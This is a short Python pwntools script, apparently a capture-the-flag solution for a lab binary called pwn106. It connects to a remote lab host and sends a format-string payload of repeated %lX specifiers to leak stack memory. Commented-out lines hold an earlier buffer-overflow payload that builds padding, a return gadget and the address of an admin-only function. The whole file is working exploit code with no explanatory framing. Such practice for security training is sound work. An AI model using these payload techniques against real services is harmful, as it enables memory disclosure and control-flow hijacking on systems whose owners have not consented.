'''
'/mnt/hgfs/-vagrant/work/thm/pwn/pwn106/pwn106user.pwn106-user'
Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

from pwn import *

# for taking advantage of the static symbols (like addresses in the given function) in the program
# context.arch = "amd64"
context.binary = binary = "./pwn106user.pwn106-user"
# context.binary = binary = "./pwn103.pwn103"

host = '10.10.244.199'
port = 9006
elf = ELF("./pwn106user.pwn106-user")

# p = process(binary)
p = remote(host, port)
p.recv()
# p.sendline(b'3')

# take advantage of the static symbol (admins_only)
# Should change the value into little endian in 8bytes
# admins_only_address = p64(elf.symbols.admins_only)
# payload = b"A"*(0x20+0x8) + admins_only_address

# Should add return gadget before returning into function
# return_address = p64(0x00401677)
# admins_only_address = p64(0x00401554)
# payload = b"A"*(0x20+0x8) + return_address + admins_only_address

payload = "%lX %lX %lX %lX %lX %lX %lX %lX %lX %lX %lX %lX %lX"

p.sendline(payload)
print(p.recvall())
